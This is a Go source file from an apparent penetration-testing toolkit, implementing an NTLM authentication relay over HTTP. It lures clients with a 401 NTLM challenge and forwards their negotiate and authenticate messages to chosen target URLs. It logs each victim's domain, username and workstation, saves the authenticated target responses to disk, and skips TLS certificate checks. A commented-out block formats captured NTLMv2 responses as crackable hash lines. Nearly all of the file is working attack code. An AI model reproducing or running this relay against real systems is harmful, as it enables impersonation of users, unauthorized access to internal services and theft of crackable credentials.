package gopRelay

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/hophouse/gop/authentication/ntlm"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils/logger"
)

func Run(serverAddr string, targets []string) {

	logger.Printf("[+] Run server on : http://%s\n", serverAddr)

	l, err := net.Listen("tcp4", serverAddr)
	if err != nil {
		logger.Fatal(err)
	}
	defer l.Close()

	connexions := []*NTLMAuthHTTPRelay{}

	for {
		conn, err := l.Accept()
		if err != nil {
			// handle error
			logger.Println(err)
			break
		}

		go func() {
			client := NTLMAuthHTTPRelay{
				ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
				clientConn:     conn,
				NTLMHandler: ntlm.NTLMAuth{
					Challenge:              "00000000",
					DomainName:             "smbdomain",
					ServerName:             "DC",
					DnsDomainName:          "smbdomain.local",
					DnsServerName:          "dc.smbdomain.local",
					PreliminaryChecksFunc:  ntlm.NTLMPreliminaryChecks,
					DispatchFunc:           ntlm.NTLMDispatch,
					ServerNegociateFunc:    ntlm.ServerNegociate,
					ServerChallengeFunc:    ntlm.ServerChallege,
					ServerAuthenticateFunc: ntlm.ServerAuthenticate,
				},
				Relays: []*Relay{},
				mu:     &sync.Mutex{},
			}

			clientInitiateRequest, err := client.initiateWWWAuthenticate()
			if err != nil {
				logger.Println(err)
				return
			}

			for _, target := range targets {
				targetTrimed := strings.Trim(target, "\"")

				err := client.initiateRelais(clientInitiateRequest, targetTrimed)
				if err != nil {
					logger.Println(err)
					return
				}
				connexions = append(connexions, &client)

				logger.Printf("[+] Adding the connexion %s to the list\n", client.ClientConnUUID)
			}

			DisplayConnexions(connexions)
		}()
	}
}

type NTLMAuthHTTPRelay struct {
	ClientConnUUID string
	clientConn     net.Conn
	NTLMHandler    ntlm.NTLMAuth
	Relays         []*Relay
	mu             *sync.Mutex
	Domain         string
	Username       string
	Workstation    string
}

type Relay struct {
	target string
	conn   *http.Client
	mu     *sync.Mutex
}

func (n *NTLMAuthHTTPRelay) initiateWWWAuthenticate() (*http.Request, error) {
	for {
		reader := bufio.NewReader(n.clientConn)

		clientInitiateRequest, err := http.ReadRequest(reader)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return nil, err
		}
		clientInitialRequestDump, err := httputil.DumpRequest(clientInitiateRequest, true)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return nil, err
		}
		io.Copy(ioutil.Discard, clientInitiateRequest.Body)
		clientInitiateRequest.Body.Close()

		for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
			logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		// Send WWW-Authenticate: NTLM header if not present
		if clientAuthorization := clientInitiateRequest.Header.Get("Authorization"); clientAuthorization == "" {
			clientInitialResponseByte := []byte(
				"HTTP/1.1 401 Unauthorized\n" +
					"WWW-Authenticate: NTLM\n" +
					"WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			n.clientConn.Write(clientInitialResponseByte)

			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			continue
		} else {
			return clientInitiateRequest, nil
		}
	}
}

func (n *NTLMAuthHTTPRelay) initiateRelais(initialRequest *http.Request, target string) error {
	func() {
		logger.Printf("%s | Acquire lock\n", n.ClientConnUUID)
		n.mu.Lock()
	}()
	defer func() {
		logger.Printf("%s | Release lock\n", n.ClientConnUUID)
		n.mu.Unlock()
	}()

	currentRelay := Relay{
		target: target,
		mu:     &sync.Mutex{},
	}

	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		// Proxy:           http.ProxyURL(proxyURL),
	}
	currentRelay.conn = &http.Client{Transport: tr}

	var clientInitiateRequest *http.Request

	for {
		if clientInitiateRequest == nil {
			clientInitiateRequest = initialRequest
		} else {
			var err error
			reader := bufio.NewReader(n.clientConn)

			clientInitiateRequest, err = http.ReadRequest(reader)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			clientInitialRequestDump, err := httputil.DumpRequest(clientInitiateRequest, true)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			io.Copy(ioutil.Discard, clientInitiateRequest.Body)
			clientInitiateRequest.Body.Close()

			for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")
		}

		// Get the response header.
		clientAuthorization := clientInitiateRequest.Header.Get("Authorization")

		authorization_bytes, err := base64.StdEncoding.DecodeString(clientAuthorization[5:])
		if err != nil {
			err := fmt.Errorf("decode error authorization header : %s", clientAuthorization)
			return err
		}
		msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

		logger.Fprintf(logger.Writer(), "%s | [+] Message type : %d\n", n.ClientConnUUID, msgType)

		// Received Negociate message. Handle it and answer with a Challenge message
		if msgType == uint32(1) {
			// Client Negotiate
			serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
			serverNegociateRequest.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM NEGOCIATE\n", n.ClientConnUUID)
			for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			}

			/*
			 *
			 * Client part
			 *
			 */
			currentRelay.mu.Lock()
			clientNegotiateRequest := gopproxy.CopyRequest(clientInitiateRequest)
			clientNegotiateRequest.Method = "GET"
			clientNegotiateRequest.URL, err = url.Parse(target)
			if err != nil {
				logger.Println(err)
				return err
			}

			clientNegotiateRequest.Header.Set("Connection", "keep-alive")
			clientNegotiateResp, err := currentRelay.conn.Do(clientNegotiateRequest)
			if err != nil {
				logger.Println(err)
				return err
			}

			logger.Fprintf(logger.Writer(), "%s | gop :: target | [+] Client NEGOCIATE request :\n", n.ClientConnUUID)
			clientNegotiateRequestDump, err := httputil.DumpRequest(clientNegotiateRequest, true)
			if err != nil {
				logger.Println(err)
				return err
			}

			for _, line := range strings.Split(string(clientNegotiateRequestDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | gop -> target : %s\n", n.ClientConnUUID, line)
			}
			logger.Fprintf(logger.Writer(), "\n")

			logger.Fprintf(logger.Writer(), "%s | gop :: target | [+] Client NEGOCIATE response = Target CHALLENGE:\n", n.ClientConnUUID)
			clientNegotiateRespDump, err := httputil.DumpResponse(clientNegotiateResp, true)
			if err != nil {
				return err
			}

			for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | gop <- target : %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			authorization := clientNegotiateResp.Header.Get("Www-Authenticate")

			if clientNegotiateResp.StatusCode != 401 {
				err := fmt.Errorf("client respond with a %s code", clientNegotiateResp.Status)
				logger.Fprintf(logger.Writer(), "%s |   Error       : %s\n", n.ClientConnUUID, err)
				currentRelay.conn.CloseIdleConnections()
				return err
			}

			authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
			if err != nil {
				err := fmt.Errorf("decode error authorization header : %s", authorization)
				return err
			}

			clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
			clientChallengeNTLM.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID)
			for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | gop :: target | %s\n", n.ClientConnUUID, line)
			}

			currentRelay.mu.Unlock()
			/*
			 *
			 * End client part
			 *
			 */

			n.clientConn.Write(clientNegotiateRespDump)
			for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
			}

			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID)

			continue
		}

		// Retrieve information into the Authentication message
		if msgType == uint32(3) {
			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID)

			serverAuthenticate := ntlm.NTLMSSP_AUTH{}
			serverAuthenticate.Read(authorization_bytes)

			// ntlmAuthenticateInfo := fmt.Sprintf("Target Name: %s\nUsername: %s\nWorkstation: %s\n", serverAuthenticate.TargetName.RawData, serverAuthenticate.Username.RawData, serverAuthenticate.Workstation.RawData)
			// logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM AUTHENTICATE:\n", n.ClientConnUUID)
			// for _, line := range strings.Split(ntlmAuthenticateInfo, "\n") {
			// 	logger.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			// }

			n.Domain = string(serverAuthenticate.TargetName.RawData)
			n.Username = string(serverAuthenticate.Username.RawData)
			n.Workstation = string(serverAuthenticate.Workstation.RawData)

			logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID)
			for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			}

			// Prepare final response to the client
			ntlmv2Response := ntlm.NTLMv2Response{}
			ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.RawData)

			fmt.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID)
			for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
			}

			// logger.Fprintf(logger.Writer(), "%s | client :: gop | [+] Received token : %s\n", n.ClientConnUUID, clientAuthorization)

			/*
			 *
			 * Client part
			 *
			 */
			currentRelay.mu.Lock()

			clientAuthRequest := gopproxy.CopyRequest(clientInitiateRequest)
			clientAuthRequest.Method = "GET"
			clientAuthRequest.URL, err = url.Parse(target)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			clientAuthRequest.Header.Set("Connection", "keep-alive")
			clientAuthRequest.Header.Set("Accept-Encoding", "deflate")
			clientAuthRequest.Header.Set("Content-Length", "0")

			clientAuthRequestDump, err := httputil.DumpRequest(clientAuthRequest, true)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}

			for _, line := range strings.Split(string(clientAuthRequestDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | gop -> target : %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			clientAuthResp, err := currentRelay.conn.Do(clientAuthRequest)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			clientAuthRespDump, err := httputil.DumpResponse(clientAuthResp, true)
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			io.Copy(ioutil.Discard, clientAuthResp.Body)
			clientAuthResp.Body.Close()

			for _, line := range strings.Split(string(clientAuthRespDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | gop <- target : %s\n", n.ClientConnUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			currentRelay.mu.Unlock()
			/*
			 *
			 * End client part
			 *
			 */

			// Save response
			uu, _ := uuid.NewUUID()
			targetURLSanitized := strings.Replace(strings.Replace(currentRelay.target, ":", "", -1), "/", "", -1)
			filename := fmt.Sprintf("%s-%s.html", targetURLSanitized, uu)
			err = os.WriteFile(filename, clientAuthRespDump, fs.ModeAppend)
			if err != nil {
				logger.Println(err)
			}

			break
		}
	}

	n.Relays = append(n.Relays, &currentRelay)

	return nil
}

func DisplayConnexions(connexions []*NTLMAuthHTTPRelay) {
	for _, connexion := range connexions {
		logger.Printf("\t%s:\n", connexion.ClientConnUUID)

		logger.Printf("\tUser: %s\\%s\n", connexion.Domain, connexion.Username)
		logger.Printf("\tWorkstation: %s\n", connexion.Workstation)
		logger.Print("\tRelays:\n")
		for i, relay := range connexion.Relays {
			logger.Printf("\t\t%d: %s\n", i, relay.target)
		}
	}
}

func KeepAlive(w http.ResponseWriter, wg *sync.WaitGroup) {
	wg.Add(1)

	for {
		logger.Println("[+] Sending keep alive")

		hj, _ := w.(http.Hijacker)
		_, buf, _ := hj.Hijack()
		buf.WriteString("HTTP/1.1 200 OK")
		buf.WriteString("Connection: keep-alive")
		buf.WriteString("\n\n")
		buf.Flush()

		time.Sleep(20 * time.Second)
	}
}

// func HandleConnection(conn net.Conn) {

// 	logger.Fprintf(logger.Writer(), "Receive conenction from %s to %s\n", conn.RemoteAddr(), conn.LocalAddr())
// 	reader := bufio.NewReader(conn)

// 	req, err := http.ReadRequest(reader)
// 	if ok := utils.CheckError(err); ok {
// 		return
// 	}
// 	defer req.Body.Close()

// 	// Dial the client
// 	initConn, err := net.DialTimeout("tcp4", req.URL.Host, 2*time.Second)
// 	if ok := utils.CheckError(err); ok {
// 		return
// 	}
// 	defer initConn.Close()

// 	clientConn := tls.Client(initConn, &tls.Config{InsecureSkipVerify: true})
// 	err = clientConn.Handshake()
// 	if ok := utils.CheckError(err); ok {
// 		return
// 	}

// 	conn.Write([]byte("HTTP/1.1 200 OK\r\nProxy-agent: GoPentest/1.0\r\n\r\n"))

// 	config := &tls.Config{
// 		InsecureSkipVerify: true,
// 	}

// 	proxyConn := tls.Server(conn, config)
// 	err = proxyConn.Handshake()
// 	if ok := utils.CheckError(err); ok {
// 		return
// 	}
// 	defer proxyConn.Close()

// 	proxyReader := bufio.NewReader(proxyConn)
// 	req, err := http.ReadRequest(proxyReader)
// 	if ok := utils.CheckError(err); ok {
// 		return
// 	}
// 	PrintGUIRequest(req)
// 	intercept()

// 	dumpedReq, _ := httputil.DumpRequest(req, true)
// 	clientConn.Write(dumpedReq)

// 	clientReader := bufio.NewReader(clientConn)
// 	res, err := http.ReadResponse(clientReader, req)
// 	if ok := utils.CheckError(err); ok {
// 		return
// 	}
// 	//defer res.Body.Close()

// 	PrintGUIResponse(*res)
// 	intercept()

// 	dumpedRes, _ := httputil.DumpResponse(res, true)
// 	proxyConn.Write(dumpedRes)

// 	proxyConn.Close()
// 	clientConn.Close()
// 	return

// 	// Do request to target
// 	res := doHTTPRequest(req)
// 	if res == nil {
// 		return
// 	}
// 	//defer res.Body.Close()

// 	sendNetResponse(conn, res)
// }

// func (n NTLMAuthHTTPRelay) ServeHTTP(w http.ResponseWriter, r *http.Request) {
// 	// Once a request is received use it to relay it to a website
// 	logger.Printf("[+] Received a new connexion from : %s\n", r.RemoteAddr)
// 	_, exist := client[r.RemoteAddr]
// 	if !exist {
// 		logger.Printf("[+] Received a new connexion from : %s\n", r.RemoteAddr)
// 	}

// 	logger.Printf("[+] Server request from client :\n")
// 	serverInitialRequestDump, err := httputil.DumpRequest(r, true)
// 	if err != nil {
// 		logger.Println(err)
// 		return
// 	}

// 	for _, line := range strings.Split(string(serverInitialRequestDump), "\n") {
// 		logger.Printf("client > gop : %s\n", line)
// 	}

// 	// Get the response header.
// 	authorization := r.Header.Get("Authorization")

// 	if authorization == "" {
// 		w.Header().Set("WWW-Authenticate", "NTLM")
// 		w.WriteHeader(401)
// 		return
// 	}

// 	msg3, ntlmv2Response, err := n.Dispatch(w, r)
// 	if err != nil {
// 		logger.Print(err)
// 		return
// 	}

// 	if msg3 != nil && ntlmv2Response != nil {
// 		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(n.NTLMHandler.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])

// 		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
// 		if _, found := ntlm.NtlmCapturedAuth[authInformations]; !found {
// 			ntlm.NtlmCapturedAuth[authInformations] = true
// 			logger.Printf("\n[+] PWDUMP:\n%s\n", ntlmv2_pwdump)
// 		} else {
// 			logger.Printf("\n[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
// 		}
// 	}
// }

// func (n NTLMAuthHTTPRelay) Dispatch(w http.ResponseWriter, r *http.Request) (*ntlm.NTLMSSP_AUTH, *ntlm.NTLMv2Response, error) {
// 	authorization := r.Header.Get("Authorization")
// 	authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
// 	if err != nil {
// 		err := fmt.Errorf("Decode error authorization header : %s\n", authorization)
// 		return nil, nil, err
// 	}
// 	msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

// 	logger.Printf("[+] Message type : %d\n", msgType)

// 	w.Header().Set("Connection", "keep-alive")
// 	// Received Negociate message. Handle it and answer with a Challenge message
// 	if msgType == uint32(1) {
// 		err := n.NTLMHandler.ServerNegociateFunc(w, r)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		/*
// 		 *
// 		 * Client part
// 		 *
// 		 */
// 		tr := &http.Transport{
// 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // <--- Problem
// 		}
// 		client := &http.Client{Transport: tr}

// 		clientNegotiateRequest := gopproxy.CopyRequest(r)
// 		clientNegotiateRequest.Method = "GET"
// 		clientNegotiateRequest.URL, err = url.Parse(TargetURL)
// 		if err != nil {
// 			return nil, nil, err
// 		}
// 		clientNegotiateRequest.Header.Set("Connection", "keep-alive")

// 		logger.Printf("[+] Client NEGOCIATE request :\n")
// 		clientNegotiateRequestDump, err := httputil.DumpRequest(clientNegotiateRequest, true)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		for _, line := range strings.Split(string(clientNegotiateRequestDump), "\n") {
// 			logger.Printf("gop > target : %s\n", line)
// 		}
// 		logger.Print("\n")
// 		clientNegotiateResp, err := client.Do(clientNegotiateRequest)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		logger.Printf("[+] Client NEGOCIATE response :\n")
// 		clientNegotiateRespDump, err := httputil.DumpResponse(clientNegotiateResp, true)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
// 			logger.Printf("gop < target : %s\n", line)
// 		}
// 		logger.Print("\n")

// 		authorization := clientNegotiateResp.Header.Get("Www-Authenticate")

// 		authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
// 		if err != nil {
// 			err := fmt.Errorf("Decode error authorization header : %s\n", authorization)
// 			return nil, nil, err
// 		}

// 		clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
// 		clientChallengeNTLM.Read(authorization_bytes)

// 		logger.Print("[+] Client Challenge\n")
// 		logger.Printf("%s\n", clientChallengeNTLM.ToString())

// 		/*
// 		 *
// 		 * End client part
// 		 *
// 		 */

// 		err = n.NTLMHandler.ServerChallengeFunc(w, r, string(clientChallengeNTLM.Challenge), "srv-exchange.offsec.lab")
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		logger.Printf("[+] Send server challenge to client\n")

// 		/**/
// 		var inp string
// 		fmt.Print("Next ?")
// 		fmt.Scanln(&inp)
// 		/**/

// 		return nil, nil, nil
// 	}

// 	// Retrieve information into the Authentication message
// 	if msgType == uint32(3) {
// 		logger.Printf("[+] Server received Authenticate\n")
// 		_, _, err := n.NTLMHandler.ServerAuthenticateFunc(w, r)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		logger.Printf("[+] Received token : %s\n", authorization)

// 		/**/
// 		var inp string
// 		fmt.Print("Next ?")
// 		fmt.Scanln(&inp)
// 		/**/

// 		/*
// 		 *
// 		 * Client part
// 		 *
// 		 */
// 		tr := &http.Transport{
// 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
// 		}
// 		client := &http.Client{Transport: tr}

// 		clientAuthRequest := gopproxy.CopyRequest(r)
// 		clientAuthRequest.Method = "GET"
// 		clientAuthRequest.URL, err = url.Parse(TargetURL)
// 		if err != nil {
// 			return nil, nil, err
// 		}
// 		clientAuthRequest.Header.Set("Connection", "keep-alive")

// 		clientAuthRequestDump, err := httputil.DumpRequest(clientAuthRequest, true)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		for _, line := range strings.Split(string(clientAuthRequestDump), "\n") {
// 			logger.Printf("gop > target : %s\n", line)
// 		}
// 		logger.Print("\n")

// 		clientAuthResp, err := client.Do(clientAuthRequest)
// 		if err != nil {
// 			return nil, nil, err
// 		}
// 		io.Copy(ioutil.Discard, clientAuthResp.Body)
// 		clientAuthResp.Body.Close()

// 		clientAuthRespDump, err := httputil.DumpResponse(clientAuthResp, true)
// 		if err != nil {
// 			return nil, nil, err
// 		}

// 		for _, line := range strings.Split(string(clientAuthRespDump), "\n") {
// 			logger.Printf("gop < target : %s\n", line)
// 		}
// 		logger.Print("\n")

// 		/*
// 		 *
// 		 * End client part
// 		 *
// 		 */

// 		return nil, nil, nil
// 	}

// 	return nil, nil, nil
// }
